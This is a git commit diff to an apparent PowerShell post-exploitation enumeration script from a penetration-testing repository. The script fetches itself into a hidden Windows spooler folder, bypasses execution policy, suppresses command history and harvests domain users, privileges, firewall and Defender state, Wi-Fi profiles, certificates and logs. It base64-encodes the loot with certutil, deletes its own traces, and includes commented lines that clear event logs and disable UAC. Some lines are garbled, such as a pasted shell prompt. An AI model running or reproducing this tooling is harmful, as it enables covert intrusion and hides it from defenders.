076344c0133bc3dae99b5e5c97b3503109f39dcc
h1dz <85143916+h1dz@users.noreply.github.com>
2021-11-24 16:12:23 +1100

    Update and rename win3num.ps1 to winenum.ps1

--- winenum.ps1
+++ winenum.ps1
@@ -1,13 +1,13 @@
 <#
 Download script:
-(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/h1dz/Pen-Testing/BashScripts/win3num.ps1", "C:\Windows\System32\spool\drivers\color\winenum.ps1")
+(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/h1dz/Pen-Testing/BashScripts/winenum.ps1", "C:\Windows\System32\spool\drivers\color\winenum.ps1")
 #>
 ################################## Setup ##################################
 Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
-attrib +h webenum.ps1
-Unblock-File -Path .\webenum.ps1
-powershell -ExecutionPolicy Bypass -noninteractive -nologo -File .\webenum.ps1
+attrib +h winenum.ps1
+Unblock-File -Path .\winenum.ps1
+powershell -ExecutionPolicy Bypass -noninteractive -nologo -File .\winenum.ps1
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
 Unblock-File -Path "C:\Windows\System32\spool\drivers\color\1.txt"
 powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\1.txt"
@@ -30,15 +30,20 @@ net user /domain | Out-File -FilePath .\1.txt -Append
 net user $domain_user /domain | Out-File -FilePath .\1.txt -Append 
 net group /domain | Out-File -FilePath .\1.txt -Append   
 Get-TimeZone | Out-File -FilePath .\1.txt -Append 
+$env:COMPUTERNAME | Out-File -FilePath .\1.txt -Append 
+$env:USERNAME | Out-File -FilePath .\1.txt -Append 
+$env:USERPROFILE | Out-File -FilePath .\1.txt -Append 
+$env:USERDOMAIN | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## PC Info ##################################" | Out-File -FilePath .\1.txt -Append
 wmic os get osarchitecture | Out-File -FilePath .\1.txt -Append 
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" | Out-File -FilePath .\1.txt -Append 
 systeminfo | Out-File -FilePath .\1.txt -Append 
+C:\Users\Shaun> Get-Host | Select-Object Version | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Privs ##################################" | Out-File -FilePath .\1.txt -Append
 whoami /priv | Out-File -FilePath .\1.txt -Append 
 whoami /groups | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Firewall Info ##################################" | Out-File -FilePath .\1.txt -Append
-Netsh Advfirewall show allprofiles | Out-File -FilePath .\1.txt -Append 
+netsh Advfirewall show allprofiles | Out-File -FilePath .\1.txt -Append 
 netsh firewall show state | Out-File -FilePath .\1.txt -Append 
 netsh firewall show config | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Defender Info ##################################" | Out-File -FilePath .\1.txt -Append
@@ -98,17 +103,37 @@ foreach($port in $text_port){
      }
 
 }
-
+Write-Output "################################## Msic. ##################################" | Out-File -FilePath .\1.txt -Append
+echo 'Previous Connections to WLAN' | Out-File -FilePath .\1.txt -Append 
+netsh wlan show profile | Out-File -FilePath .\1.txt -Append 
+echo 'Users Home Folders' | Out-File -FilePath .\1.txt -Append 
+Get-ChildItem $home | Out-File -FilePath .\1.txt -Append 
+echo 'Get Certificates' | Out-File -FilePath .\1.txt -Append 
+Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert | Out-File -FilePath .\1.txt -Append 
+echo 'Show Available Logs' | Out-File -FilePath .\1.txt -Append 
+Get-Eventlog -list | Out-File -FilePath .\1.txt -Append 
 Write-Output "##############################################################################" | Out-File -FilePath .\1.txt -Append
 Get-Date | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Finished ##################################" | Out-File -FilePath .\1.txt -Append  
+# Encode base64
+certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 0.txt
 Unblock-File -Path "C:\Windows\System32\spool\drivers\color\0.txt"
 powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\0.txt"
+# Send output file
+
+# Remove bash history
+# Remove-Item C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+# Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# Clear-EventLog -LogName Windows PowerShell, System, Application, OAlerts, Security -ComputerName $env:computername -ErrorAction SilentlyContinue
+# clear-all-event-logs -ComputerName $env:computername
 attrib -h 1.txt
 attrib -h 2.txt
-Remove-Item 1.txt
-Remove-Item 2.txt
-attrib -h webenum.ps1
+Remove-Item 1.txt -Force
+Remove-Item 2.txt -Force
+attrib -h winenum.ps1
 Clear-History
 Clear-Host
-Remove-Item webenum.ps1
+Remove-Item winenum.ps1 -Force 
+#Disables UAC, need restart
+#New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
+#Restart-Computer -Force
